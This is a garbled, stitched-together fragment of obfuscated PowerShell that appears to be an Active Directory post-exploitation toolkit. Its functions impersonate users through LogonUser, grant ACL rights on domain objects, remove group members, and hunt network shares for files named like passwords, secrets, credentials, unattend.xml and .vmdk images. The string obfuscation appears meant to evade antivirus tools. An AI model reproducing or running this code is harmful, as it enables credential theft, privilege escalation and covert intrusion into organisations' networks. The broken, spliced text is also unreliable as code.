        YoV{neTwoIJKRIJKkcREdIJKentiIJKAL} = YoV{cIJKRIJKEdeIJKNTIAL}.(Z3b{0}{1}{2}{3}Z3b-f S5zGetNS5z,S5zetworkCS5z,S5zredenS5z,S5ztialS5z).Invoke()
        YoV{USIJKEIJKRdoIJKmaIn} = YoV{nIJKeTwOrkIJKCREDentiIJKAl}.Z3bDomIJKAinZ3b
        YoV{USERIJKNIJKAME} = YoV{nIJKetwORIJKkcrIJKedenTIaL}.Z3bUsEIJKRIJKNamEZ3b
        &(Z3b{1}{3}{2}{0}Z3b -f S5zgS5z,S5zWrS5z,S5zinS5z,S5zite-WarnS5z) Z3b[Invoke-UserImpersonation] Executing LogonUser() with user: YoV(YoVUserDomain)5rjYoV(YoVUserName) Z3b

        
        
        YoV{rIJKeSult} = YoV{aDIJKVapIIJK32}::(Z3b{0}{1}{2}Z3b -f S5zLS5z,S5zogonS5z,S5zUserS5z).Invoke(YoV{USeRIJKNaME}, YoV{UseIJKRIJKdomIJKAin}, YoV{NIJKETWIJKORKIJKCRedenTiaL}.Z3bpaIJKsswIJKorDZ3b, 9, 3, [ref]YoV{loGIJKoIJKNTIJKOKENHaIJKNDLe});YoV{LASIJKTerrIJKOr} =  (  &(Z3b{0}{1}{2}Z3b -fS5zgS5z,S5zeS5z,S5zT-VaRIABLES5z)  dSm3 -VaLu)::(Z3b{1}{2}{3}{0}Z3b-fS5zrorS5z,S5zGetLastWiS5z,S5zn32ES5z,S5zrS5z).Invoke();

        if (-not YoV{rIJKEsulT}) {
            throw Z3b[Invoke-UserImpersonation] LogonUser() Error: YoV(([ComponentModel.Win32Exception] YoVLastError).Message) Z3b
        }
    }

    
    YoV{ReIJKSIJKUlt} = YoV{AIJKDIJKVAPi32}::(Z3b{3}{1}{0}{5}{4}{2}Z3b-f S5zeS5z,S5zatS5z,','eS5z,S5zrLDAPFS5z,S5zrS5z,S5zilteS5z)] -or YoV{PIJKsIJKBOIJKUndPIJKArIJKAMeteRs}[(Z3b{2}{3}{4}{0}{1}Z3b-fS5zasS5z,S5zeS5z,S5zUsS5z,S5zerSearS5z,S5zchBS5z)] -or YoV{pIJKSIJKBoUNIJKDpIJKAIJKRAmEtERs}[(Z3b{0}{3}{1}{2}Z3b -fS5zUS5z,S5zerAdminCounS5z,S5ztS5z,S5zsS5z)] -or YoV{PIJKsbOuNdIJKpAIJKRamETeRs}[(Z3b{0}{2}{3}{1}Z3b -f S5zUserS5z,S5znS5z,S5zAllowDelS5z,S5zegatioS5z)]) {
            YoV{tIJKAIJKRgeTuSeRS} = &(Z3b{0}{1}{3}{2}Z3b -fS5zGetS5z,S5z-DoS5z,S5zrS5z,S5zmainUseS5z) @UserSearcherArguments JGO &(Z3b{2}{1}{0}Z3b -fS5z-ObjectS5z,S5zlectS5z,S5zSeS5z) -ExpandProperty (Z3b{3}{0}{1}{2}Z3b -fS5zountS5z,S5znaS5z,S5zmeS5z,S5zsam','     YoV{seIJKRveR},

                [String]
                YoV{sIJKearcIJKhIJKscope} = (Z3b{2}{1}{0}Z3b -f S5zreeS5z,S5zubtS5z,S5zSS5z),

                [Int]
                YoV{ReIJKsUlIJKTPAGIJKEsIzE} = 200,

                [Int]
                YoV{seRvIJKeRTiMELiIJKMIJKit},

                [Switch]
                YoV{TomBIJKStIJKoNe},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                YoV{CIJKRIJKEDenTial} =  ( &(Z3b{1}{0}Z3b-fS5zciS5z,S5zgS5z)  (Z3bvaRiZ3b+Z3babZ3b+Z3blZ3b+Z3be:JfiZ3b)).Z3bVALIJKUEZ3b::Z3bEMPIJKTyZ3b
            )

            YoV{DfIJKsIJKseaRCHer} = &(Z3b{0}{2}{3}{1}Z3b-fS5zGet-DomaS5z,S5zrcherS5z,S5zi','ameter(pOsition = 0, vAluEFroMpiPELIne = YoV{TRIJKUE}, vALuefrOMpIPELIneByProPeRtYNAmE = YoV{TRIJKUe})]
        [Alias({Z3b{1}{0}Z3b -fS5zmeS5z,S5zNaS5z})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{FOrEIJKST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]','5zYoVMemberS5z Z3b+S5zfrS5z+S5zom S5z+S5zgrS5z+S5zoupS5z+S5z S5z+Z3bS5zYoVIdentityS5zZ3b)
                YoV{mEIJKMIJKBeR} = [System.DirectoryServices.AccountManagement.Principal]::(Z3b{1}{4}{2}{0}{3}Z3b-fS5zyIdeS5z,S5zFS5z,S5zBS5z,S5zntityS5z,S5zindS5z).Invoke(YoV{USIJKeRconIJKTIJKeXt}.Z3bcOIJKNtIJKeXTZ3b, YoV{useIJKRIJKIDEnIJKTIJKItY})
                YoV{GRIJKOuP}.Z3bMEMbIJKERsZ3b.(Z3b{1}{0}{2}Z3b -f S5zemovS5z,S5zRS5z,S5zeS5z).Invoke(YoV{meMbIJ','1}{3}{4}Z3b-fS5ztS5z,S5ze-S5z,S5zWriS5z,S5zVS5z,S5zerboseS5z) (Z3b{12}{10}{6}{1}{2}{11}{5}{0}{9}{3}{4}{8}{7}Z3b -fS5z fS5z,S5zaS','5zroS5z,S5zpertyS5z,S5zepS5z,S5zNotS5z) (Z3b','S5zTimeS5z)               = YoV{evEIJKNT}.Z3btIIJKmEIJKCReAteDZ3b
               ','z)] = YoV{PrIJKoperTIJKIeS} }
        if (YoV{pSBIJKouNdPIJKAraIJKMetIJKErs}[(Z3b{0}{1}{2}Z3b -f S5zSearS5z,S5zchBasS5z,S5zeS5z)]) { YoV{seAIJKRcIJKhIJKErarGUIJKmenTS}[(Z3b{0}{1}{2}Z3b -f S5zSearcS5z,S5zhBasS5z,S5zeS5z)] = YoV{SeaRIJKCIJKhBasE} }
        if (YoV{PsBoIJKUNdpAIJKRAMIJKeIJKTerS}[(Z3b{2}{0}{1}Z3b -fS5zeS5z,S5zrverS5z,S5zSS5z)]) { YoV{SEARcIJKHeraIJKRIJKguMIJKENtS}[(Z3b{0}{1}Z3b-f S5zServeS5z,S5zrS5z)] = YoV{sIJKEIJKRveR} }
        if (YoV{PIJKsBOUNDParIJKAMIJKETErS}[(Z3b{2}{1}{3}{0}Z3b-f S5zpeS5z,S5zeS5z,S5zSS5z,S5zarchScoS5z)]) { YoV{SIJKeArIJKCIJKHIJKErArgUments}[(Z3b{2}{1}{0}Z3b-fS5zcopeS5z,S5zearchSS5z,S5zSS5z)] = YoV{seAIJKRCHScIJKoIJKPE} }
        if (YoV{psboUNIJKdparIJKAMEIJKTIJKeRs}[(Z3b{3}{0}{4}{1}{2}Z3b -f S5zesulS5z,S5zagS5z,S5zeSizeS5z,S5zRS5z,S5ztPS5z)]) { YoV{sEAIJKRchERarIJKgIJKUMEIJKNts}[(Z3b{2}{0}{1}Z3b-f S5zi','z,S5z-varS5z)  (S5zAeS5z+S5zPsiS5z)  ).Z3bVALIJKUEZ3b::(Z3b{2}{1}{0}Z3b-fS5z32S5z,S5zIntS5z,S5zToUS5z).Invoke(YoV{dNsIJKRIJKEcoRD}, 8)

        YoV{TtlrIJKAw} = YoV{DIJKNsREIJKcORD}[12..15]

        
        YoV{NUIJKll} =  YoV{TYIJKM8}::(Z3b{1}{2}{0}Z3b -f S5zrseS5z,S5zRevS5z,S5zeS5z).Invoke(YoV{TTIJKLraw})
        YoV{TIJKTl} =  ( &(Z3b{2}{0}{1}{3}Z3b-f S5zeT-vS5z,S5zariS5z,S5zGS5z,S5zABLeS5z)  aepSi  -Valu)::(Z3b{2}{1}{0}Z3b-f S5zInt32S5z,S5zUS5z,S5zToS5z).Invoke(YoV{tIJKTlIJKRaW}, 0)

        YoV{aIJKGE} =  ( &(Z3b{3}{2}{1}{0}Z3b-fS5zTeMS5z,S5ziS5z,S5z-ChiLDS5z,S5zGetS5z) (Z3bvarZ3b+Z3biABleZ3b+Z3b:Z3b+Z3baZ3b+Z3bEpSiZ3b) ).Z3bVIJKAlueZ3b::(Z3b{1}{2}{0}Z3b-f S5zt32S5z,S5zToS5z,S5zUInS5z).Invoke(YoV{dNIJKsreCIJKoRd}, 20)
        if (YoV{AIJKgE} -ne 0) {
            YoV{TIIJKmEsIJKTaMP} = ((&(Z3b{0}{2}{1}Z3b-f S5zGet-DS5z,S5zeS5z,S5zatS5z) -Year 1601 -Month ','eDn}
                            
                            YoV{oBIJKjecT} = &(Z3b{2}{0}{1}{3}Z3b-f S5zDomainS5z,S5zObjecS5z,S5zGet-S5z,S5ztS5z) @ObjectSearcherArguments

                            if (YoV{oBjEIJKCt}) {
                                YoV{iDIJKeNtiIJKTIJKyrIJKefEreNCeIJKNAme} = YoV{oIJKBjeCt}.Z3bPRoPIJKERtIIJKesZ3b.Z3bSaMacIJKCIJKoUnTnAmeZ3b[0]
                                if (YoV{oIJKBJIJKeCT}.Z3bPRoPIJKERIJKTiesZ3b.Z3bobJEctIJKCIJKLassZ3b -match (Z3b{0}{2}{1}Z3b -f S5zcoS5z,S5zterS5z,S5zmpuS5z)) {
                                    YoV{idenTIJKItYrIJKEfIJKeReIJKNIJKCEClAIJKss} = (Z3b{0}{2}{1}Z3b-fS5zcompS5z,S5zrS5z,S5zuteS5z)
                                }
                                elseif (YoV{ObIJKJeCT}.Z3bpIJKRIJKOpeRTIJKieSZ3b.Z3boIJKBjECTclaIJKSsZ3b -match (Z3b{0}{1}Z3b-f S5zgroS5z,S5zupS5z)) {
                                    YoV{iDeIJKNTitYrEFIJKerENceCIJKLass} = (Z3b{1}{0}Z3b -fS5zroupS5z,S5zgS5z)
                                }
                                elseif (YoV{OBIJKjIJKect}.Z3bpROPIJKEIJKRIJKTIEsZ3b.Z3bObjeCtIJKCIJKlAIJKSSZ3b -match (Z3b{0}{1}Z3b-fS5zuseS5z,S5zrS5z)) {
                                    YoV{IdenIJKTITYREfEReNCIJKEcLIJKAIJKsS} = (Z3b{0}{1}Z3b -f S5zuseS5z,S5zrS5z)
                                }
                                else {
                                    YoV{idIJKEIJKNTItIJKYRefereNcecIJKLIJKAss} = YoV{nUIJKLl}
                                }

                                
                                YoV{rEsOLIJKVeIJKDsIds}[YoV{_}.Z3bSecIJKURitYIIJKdEIJKNIJKTIIJKFiErZ3b.Z3bvIJKALUeZ3b] = YoV{iIJKdEnTiTYrefIJKeIJKRIJKENcENamE}, YoV{IdENIJKTIJKiTYIJKREf','{0}Z3b -fS5zropertyS5z,S5zNotS5z,S5zeS5z,S5zPS5z) (Z3b{2}{4}{0}{5}{3}{1}{6}Z3b-fS5zentityS5z,S5zncS5z,S5zIS5z,S5zfereS5z,S5zdS5z,S5zReS5z,S5zeClassS5z) YoV{IDIJKEIJKNIJKTiIJKTyReFIJKerIJKeNcEClAIJKSs}
               ','b{0}{3}{1}{2}Z3b-fS5zUSES5z,S5zCS5z,S5zTS5z,S5zR_OBJES5z)                     =   (Z3b{2}{1}{0}Z3b -fS5z000S5z,S5z30000S5z,S5z0xS5z)
    (Z3b{1}{3}{4}{2}{0}Z3b -f S5zTS5z,S5zMAS5z,S5zNE_ACCOUNS5z,S5zCS5z,S5zHIS5z)                 =   (Z3b{0}{2}{1}Z3b-f S5z0S5z,S5z0000001S5z,S5zx3S5z)
    (Z3b{1}{2}{0}Z3b-fS5zCOUNTS5z,S5zTRUST_S5z,S5zACS5z)                   =   (Z3b{0}{2}{1}Z3b-fS5z0xS5z,S5z002S5z,S5z30000S5z)
    (Z3b{1}{3}{0}{2}Z3b -fS5zBASICS5z,S5zAPS5z,S5z_GROUPS5z,S5zP_S5z)                 =   (Z3b{2}{0}{1}Z3b-fS5zxS5z,S5z40000000S5z,S5z0S5z)
    (Z3b{0}{2}{4}{3}{1}Z3b -f S5zAPP_S5z,S5zPS5z,S5zQUERS5z,S5zGROUS5z,S5zY_S5z)                 =   (Z3b{2}{1}{0}{3}Z3b-f S5z000S5z,S5z4S5z,S5z0xS5z,S5z0001S5z)
    (Z3b{0}{3}{1}{4}{2}Z3b -f S5zACS5z,S5zUNTS5z,S5zYPE_MAXS5z,S5zCOS5z,S5z_TS5z)                =   (Z3b{2}{0}{1}Z3b -fS5z7ffS5z,S5zfffffS5z,S5z0xS5z)
}


YoV{GRoIJKUpIJKTYpeIJKENuM} = &(Z3b{1}{0}Z3b-fS5zmS5z,S5zpsenuS5z) YoV{mIJKOd} (Z3b{4}{2}{1}{3}{6}{7}{5}{0}Z3b -f S5zEnumS5z,S5zwS5z,S5zoS5z,S5zeS5z,S5zPS5z,S5zpeS5z,S5zrView.GroupS5z,S5zTyS5z) (Z3b{0}{1}Z3b -fS5zUInS5z,S5zt32S5z) @{
    (Z3b{2}{0}{1}{3}Z3b -fS5zSYS5z,S5zSS5z,S5zCREATED_BY_S5z,S5zTEMS5z)               =   (Z3b{0}{2}{1}Z3b -fS5z0x0000S5z,S5z01S5z,S5z00S5z)
    (Z3b{0}{1}{2}Z3b-f S5zGS5z,S5zLOBAS5z,S5zL_SCOPES5z)                    =   (Z3b{1}{0}{3}{2}Z3b -fS5z0S5z,S5z0xS5z,S5z02S5z,S5z00000S5z)
    (Z3b{2}{0}{1}{4}{3}Z3b-f S5zAIS5z,S5zN_LOCAL_SS5z,S5zDOMS5z,S5zES5z,S5zCOPS5z)              =   (Z3b{2}{1}{0}Z3b -f S5z00004S5z,S5z000S5z,S5z0xS5z)
    (Z3b{2}{0}{4}{3}{1}Z3b-f S5zNIS5z,S5zCOPES5z,S5zUS5z,S5zSAL_SS5z,S5zVERS5z)                 =   (Z3b{2}{0}{1}Z3b -f S5z00S5z,S5z000008S5z,S5z0xS5z)
    (Z3b{0}{1}{2}Z3b -fS5zAPPS5z,S5z_S5z,S5zBASICS5z)                       =   (Z3b{2}{1}{0}Z3b -fS5z00010S5z,S5zx000S5z,S5z0S5z)
    (Z3b{1}{0}{2}Z3b-f S5zP_QUERS5z,S5zAPS5z,S5zYS5z)                       =   (Z3b{2}{1}{0}Z3b -fS5z20S5z,S5z00000S5z,S5z0x0S5z)
    (Z3b{2}{1}{0}Z3b -fS5zYS5z,S5zRITS5z,S5zSECUS5z)                        =   (Z3b{0}{2}{1}Z3b-fS5z0x80000S5z,S5z0S5z,S5z00S5z)
} -Bitfield


YoV{UAIJKcEIJKNuM} = &(Z3b{0}{1}Z3b -f S5zpseS5z,S5znumS5z) YoV{mIJKod} (Z3b{3}{2}{1}{0}{4}Z3b-fS5zACEnuS5z,S5z.US5z,S5zViewS5z,S5zPowerS5z,S5zmS5z) (Z3b{1}{0}Z3b -f S5zInt32S5z,S5zUS5z) @{
    (Z3b{0}{1}{2}Z3b-f S5zSCS5z,S5zRS5z,S5zIPTS5z)                          =   1
    (Z3b{1}{3}{2}{4}{0}Z3b-f S5zES5z,S5zAS5z,S5zTDIS5z,S5zCCOUNS5z,S5zSABLS5z)                  =   2
    (Z3b{0}{2}{4}{3}{1}Z3b -fS5zHOMEDS5z,S5zIREDS5z,S','Instance)Z3b
                    }
                }
            }
            if (YoV{idEIJKNtIJKItYIJKFiLteR} -and (YoV{IdeNtItIJKyIJKFIIJKlTeR}.(Z3b{1}{0}Z3b -f S5','T} }
        if (YoV{pIJKSBIJKOUIJKNDpAraIJKMeIJKTERS}[(Z3b{0}{2}{1}Z3b -fS5zSecS5z,S5zrityMasksS5z,S5zuS5z)]) { YoV{sEArCHeRIJKARIJKgIJKUIJKMEIJKNts}[(Z3b{2}{1}{4}{0}{3}Z3b -fS5zityMaskS5z,S5zuS5z,S5zSecS5z,S5zsS5z,S5zrS5z)] = YoV{sIJKECuIJKRitIJKYMASKs} }
        if (YoV{PIJKSbIJKOIJKUnDPaIJKRametIJKErS}[(Z3b{0}{1}Z3b -fS5zTombstS5z,S5zoneS5z)]) { YoV{SEaIJKRIJKChIJKErARgUmenIJKTs}[(Z3b{1}{3}{2}{0}Z3b -f S5zeS5z,S5zTS5z,S5znS5z,S5zombstoS5z)] = YoV{TIJKombsIJKToNe} }
        if (YoV{pIJKsboUNIJKdpIJKAIJKRAmETeIJKRs}[(Z3b{0}{2}{1}Z3b-fS5zCredeS5z,S5zalS5z,S5zntiS5z)]) { YoV{SeaRCIJKHIJKerArGUmEnIJKTS}[(Z3b{2}{1}{0}Z3b -f S5zalS5z,S5ztiS5z,S5zCredenS5z)] = YoV{CIJKRedEntIJKIIJKAl} }
        YoV{ouIJKsEarIJKChER} = &(Z3b{0}{2}{3}{1}Z3b-f S5zGeS5z,S5zrS5z,S5zt-DomainSeaS5z,S5zrcheS5z) @SearcherArguments
    }

    PROCESS {
        if (YoV{OusEIJKAIJKRcHeR}) {
            YoV{iDEIJKNTIJKItIJKYIJKFIltEr} = S5zS5z
            YoV{FIJKILIJKTeR} = S5zS5z
            YoV{idIJKeNIJKTIJKItY} JGO &(Z3b{1}{0}{2}Z3b-fS5zObjS5z,S5zWhere-S5z,S5zectS5z) {YoV{_}} JGO &(Z3b{3}{2}{0}{1}Z3b-f S5zeS5z,S5zctS5z,S5zjS5z,S5zForEach-ObS5z) {
                YoV{iIJKDENIJKTiTyIJKINStaNIJKCE} = YoV{_}.(Z3b{1}{0}{2}Z3b-fS5zeplaS5z,S5zRS5z,S5zceS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{1}{2}{0}Z3b -f S5zeS5z,S5zReS5z,S5zplacS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                if (YoV{iDENIJKTITIJKyIJKIIJKNsTaIJKNce} -match (Z3b{0}{1}Z3b -f S5z^OS5z,S5zU=.*S5z)) {
                    YoV{IIJKDeNtIJKityFilIJKTer} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                    if ((-not YoV{PSIJKBIJKoUIJKNdIJKpARaIJKmEterS}[(Z3b{2}{0}{1}Z3b -f S5ziS5z,S5znS5z,S5zDomaS5z)]) -and (-not YoV{PsBOuNIJKDPaIJKRIJKAmeIJKTErS}[(Z3b{3}{2}{1}{0}Z3b-fS5zeS5z,S5zchBasS5z,S5zarS5z,S5zSeS5z)])) {
                        
                        
                        YoV{iDENIJKTIJKItIJKydIJKOMAIN} = YoV{IdenTiTIJKYIJKiNSIJKTanIJKce}.(Z3b{1}','ropertS5z) = (Z3b{4}{1}{6}{5}{0}{3}{2}Z3b-fS5ztpatS5z,S5zedireS5z,S5zfilepathS5z,S5zh,proS5z,S5zhomS5z,S5zscripS5z,S5zctory,S5z)
        }
        if (YoV{PsBOIJKUnIJKdPaRIJKAmeIJKTerS}[(Z3b{0}{1}{2}Z3b-fS5zSearcS5z,S5zhBS5z,S5zaseS5z)]) { YoV{SEaRIJKCHEIJKRArgIJKUmIJKentS}[(Z3b{0}{2}{1}Z3b -f S5zSeaS5z,S5zBaseS5z,S5zrchS5z)] = YoV{sEIJKARIJKcHBaSE} }
        if (YoV{PSBOuNIJKDParIJKAmeIJKTErs}[(Z3b{0}{1}Z3b-fS5zServeS5z,S5zrS5z)]) { YoV{SEAIJKRCHeRarIJKGumIJKeNts}[(Z3b{1}{0}Z3b -f S5zrverS5z,S5zSeS5z)] = YoV{SeRIJKVIJKEr} }
        if (YoV{PIJKSBOuNDIJKpaRAmeIJKTIJKErs}[(Z3b{1}{0}{2}Z3b-fS5zcoS5z,S5zSearchSS5z,S5zpeS5z)]) { YoV{SEIJKAIJKRCherIJKARguMIJKeNTs}[(Z3b{0}{2}{1}Z3b -fS5zSearcS5z,S5zeS5z,S5zhScopS5z)] = YoV{sIJKEaRcHscOIJKpe} }
        if (YoV{PsbouNdIJKPAIJKRIJKAMETeRS}[(Z3b{1}{2}{0}{3}Z3b -fS5zsuS5z,S5zRS5z,S5zeS5z,S5zltPageSizeS5z)]) { YoV{sEaIJKRChIJKEraIJKRGUMents}[(Z3b{0}{1}{2}Z3b -fS5zResultPaS5z,S5','zeS5z,S5zstemS5z,S5zceS5z,S5zessRuS5z,S5zDirecS5z,S5zveS5z,S5zSyS5z) YoV{IIJKdEIJKNTitY}, YoV{ADrIIJKGHIJKTs}, YoV{CONTroLIJKTIJKypE}, YoV{inheIJKRItAnceIJKTIJKyIJKpe}
                    }

                    
                    ForEach (YoV{aIJKCE} in YoV{aIJKCEs}) {
                        &(Z3b{0}{1}{2}Z3b-fS5zWriteS5z,S5z-VerbS5z,S5zoseS5z) Z3b[Add-DomainObjectAcl] Granting principal YoV(YoVPrincipalObject.distinguishedname) rights GUID S5zYoV(YoVACE.ObjectType)S5z on YoV(YoVTargetObject.Properties.distinguishedname) Z3b
                        YoV{TaIJKRIJKGetENIJKTry} = YoV{tIJKArgEToBjEIJKct}.(Z3b{2}{3}{0}{1}Z3b -f S5zirectoryEntrS5z,S5zyS','{UIJKSerNaIJKMe}) -and (YoV{UsIJKErIJKNAMe}.(Z3b{0}{1}Z3b-fS5zTriS5z,S5zmS5z).Invoke() -ne S5zS5z) -and (YoV{UIJKSErIJKNAMe} -notmatch YoV{CUIJKRreIJKNtUser}) -and (YoV{uIJKSIJKernaMe} -notmatch S5z5rjYoVYoVS5z)) {

                            if ( (-not YoV{TaIJKRgeIJKTUsEIJKRS}) -or (YoV{TIJKArIJKGEIJKTUseRs} -contains YoV{UsErIJKNIJKAME})) {
                                YoV{uIJKSERLOIJKcATIJKiON} = &(Z3b{1}{2}{0}Z3b -f S5zctS5z,S5zNew-ObS5z,S5zjeS5z) (Z3b{2}{1}{0}Z3b-f S5ztS5z,S5zSObjecS5z,S5zPS5z)
                                YoV{UserlIJKOIJKCAIJKTIJKION} JGO &(Z3b{1}{0}{2}Z3b -fS5z-MeS5z,S5zAddS5z,S5zmberS5z) (Z3b{0}{1}{2}Z3b -fS5zNoteS5z,S5zproperS5z,S5ztyS5z) (Z3b{2}{0}{1}Z3b-fS5zserDomS5z,S5zainS5z,S5zUS5z) YoV{NIJKUll}
                                YoV{USErLIJKOIJKCatIJKiON} JGO &(Z3b{1}{0}{2}Z3b-f S5z-MembS5z,S5zAddS5z,S5zerS5z) (Z3b{1}{2}{0}Z3b -f S5zepropertyS5z,S5zNS5z,S5zotS5z) (Z3b{1}{0}Z3b -f S5zNameS5z,S5zUserS5z) YoV{UIJKSEIJKRNAme}
                                YoV{USeRIJKlOcatIJKIIJKon} JGO &(Z3b{2}{0}{1}Z3b-f S5zd-MembeS5z,S5zrS5z,S5zAdS5z) (Z3b{2}{1}{0}Z3b-fS5ztyS5z,S5zproperS5z,S5zNoteS5z) (Z3b{0}{2}{1}{3}Z3b -f S5zCS5z,S5zmputerNS5z,S5zoS5z,S5zameS5z) YoV{tARGetCIJKOIJKmIJKpuIJKTEr}
                                YoV{uSIJKEIJKRLIJKOcaTioN} JGO &(Z3b{0}{','eROpIJKeraTIJKiIJKNGsYSIJKTEM},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{0}{1}{2}Z3b-fS5zerviS5z,S5zceS5z,S5zPackS5z,S5zSS5z})]
        [String]
        YoV{COmpuIJKTIJKERSERviIJKcIJKepAcK},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b-f S5zmeS5z,S5ziteNaS5z,S5zSS5z})]
        [String]
        YoV{COMPutErIJKsIIJKTenIJKAIJKMe},

        [Parameter(ParAmeTerseTnaME = Z3bFIlespECIJKIFIIJKCAtIIJKONZ3b)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}{2}Z3b-f S5zarchTermS5z,S5zSeS5z,S5zsS5z}, {Z3b{0}{1}Z3b -fS5zTerS5z,S5zmsS5z})]
        [String[]]
        YoV{iIJKNCIJKLUDE} = @((Z3b{1}{2}{0}Z3b -f S5zd*S5z,S5z*S5z,S5zpassworS5z), (Z3b{2}{0}{1}Z3b -fS5zensiS5z,S5ztive*S5z,S5z*sS5z), (Z3b{1}{0}Z3b-f S5zadmin*S5z,S5z*S5z), (Z3b{0}{1}Z3b -fS5z*loS5z,S5zgin*S5z), (Z3b{0}{1}Z3b -f S5z*seS5z,S5zcret*S5z), (Z3b{0}{3}{2}{1}Z3b -f S5zunaS5z,S5z*.xmlS5z,S5zendS5z,S5zttS5z), (Z3b{2}{0}{1}Z3b-fS5z.vmS5z,S5zdkS5z,S5z*S5z), (Z3b{0}{1}{2}Z3b -f S5z*S5z,S5zcreS5z,S5zds*S5z), (Z3b{3}{2}{0}{1}Z3b-f S5ztS5z,S5zial*S5z,S5zenS5z,S5z*credS5z), (Z3b{2}{0}{1}Z3b-f S5zconS5z,S5zfigS5z,S5z*.S5z)),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern({((Z3b{1}{0}{2}{3}Z3b-fS5zhQS5z,S5zQ2hQ2S5z,S5z2hQS5z,S5z2hS5z)).Z3brEIJKpLaIJKCEZ3b(([chaR]81+[chaR]50+[chaR]104),[STrING][chaR]92)})]
        [Alias({Z3b{0}{1}Z3b-f S5zShaS5z,S5zreS5z})]
        [String[]]
        YoV{ShIJKARIJKEpATH},

        [String[]]
        YoV{exclIJKUdeDIJKShAIJKRes} = @(S5zCYoVS5z, ((S5zAdmiS5z+S5zn{0}S5z) -F[CHAr]36), (((S5zPS5z+S5zrintS5z+S5zOS5z+S5zvES5z)  -ReplacES5zOvES5z,[chaR]36)), ((S5zIPCrMFS5z).Z3bReplIJKAIJKcEZ3b(([ChAr]114+[ChAr]77+[ChAr]70),S5zYoVS5z))),

        [Parameter(PARAMETeRsETnAme = Z3bFIleIJKsIJKPECIFIJKicATIIJKoNZ3b)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        YoV{LIJKAsIJKTIJKACceSstIme},

        [Parameter(parAMeTErsetname = Z3bfiLeSpIJKEIJKCIJKIfIJKIcatIJKIOnZ3b)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        YoV{lAsIJKTWIJKRITIJKeTIMe},

        [Parameter(pARaMETERSEtnaMe = Z3bfIJKIlesPIJKECiFiCIJKAtIJKIIJKONZ3b)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        YoV{crEatiIJKONIJKTIIJKme},

        [Parameter(PArAMETerSETnaME = Z3bOFFIJKiCEDoIJKcsZ3b)]
        [Switch]
        YoV{OIJKFFIIJKcIJKedOcs},

        [Parameter(PARAmeTerseTnAMe = Z3bFRIJKeSHIJKeXIJKEsZ3b)]
        [Switch]
        YoV{FrEsHeIJKxIJKeS},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{1}{0}{4}{2}Z3b -fS5zrS5z,S5zinContS5z,S5zrS5z,S5zDomaS5z,S5zolleS5z})]
        [String]
        YoV{sIJKErVEr},

        [ValidateSet({Z3b{0}{1}Z3b-f S5zBS5z,S5zaseS5z}, {Z3b{1}{2}{0}Z3b-fS5zLevelS5z,S5zOnS5z,S5zeS5z}, {Z3b{1}{0}Z3b -fS5zreeS5z,S5zSubtS5z})]
        [String]
        YoV{seAIJKRIJKCHsCOIJKpe} = (Z3b{0}{1}Z3b -f S5zSubtreS5z,S5zeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{RIJKeIJKsUltpAIJKgeIJKsiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{servERIJKTIJKIMElimIJKIT},

        [Switch]
        YoV{tIJKomIJKBsTone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKREDenIJKTIJKial} =  YoV{jIJKFi}::Z3bEmIJKptyZ3b,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{DEIJKlIJKAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        YoV{JIJKiIJKTTer} = .3,

        [Int]
        [ValidateRange(1, 100)]
        YoV{THIJKRIJKeAds} = 20
    )

    BEGIN {
        YoV{cOmPIJKUtErSIJKeAIJKRIJKchERargUmIJKeNtS} = @{
            (Z3b{2}{0}{3}{1}Z3b -f S5zroperS5z,S5ziesS5z,S5zPS5z,S5ztS5z) = (Z3b{3}{0}{1}{2}Z3b -f S5zostS5z,S5znS5z,S5zameS5z,S5zdnshS5z)
        }
        if (YoV{pIJKSbIJKoUIJKNDPaIJKRAMeTIJKErs}[(Z3b{0}{4}{2}{1}{3}Z3b -fS5zCompS5z,S5zoS5z,S5zerDS5z,S5zmainS5z,S5zutS5z)]) { YoV{cOMPUTIJKERSEARChErIJKAIJKRGuMIJKeIJKNIJKTs}[(Z3b{0}{1}{2}Z3b-f S5zDS5z,S5zomaiS5z,S5znS5z)] = YoV{COIJKMpUTIJKerdoIJKMIJKAIN} }
        if (YoV{pSbIJKOUNdPaRamEIJKTeIJKRS}[(Z3b{2}{3}{1}{0}Z3b-fS5zerS5z,S5ztS5z,S5zComputeS5z,S5zrLDAPFilS5z)]) { YoV{cOIJKmputeRSEIJKArcHErAIJKRgUMEIJKNTS}[(Z3b{2}{1}{0}Z3b-fS5zerS5z,S5zFiltS5z,S5zLDAPS5z)] = YoV{COmIJKPIJKUIJKTERLdapfIIJKlter} }
        if (YoV{PsbIJKouIJKNDPARamEIJKTERs}[(Z3b{0}{5}{2}{1}{3}{4}Z3b -fS5zCoS5z,S5zterSeaS5z,S5zpuS5z,S5zrchBS5z,S5zaseS5z,S5zmS5z)]) { YoV{CoIJKMPUTEIJKRIJKseIJKARChIJKeRARguIJKMIJKENTs}[(Z3b{1}{3}{0}{2}Z3b -f S5zasS5z,S5zSearS5z,S5zeS5z,S5zchBS5z)] = YoV{coIJKMIJKPIJKUIJKTERSEARcIJKHbaSE} }
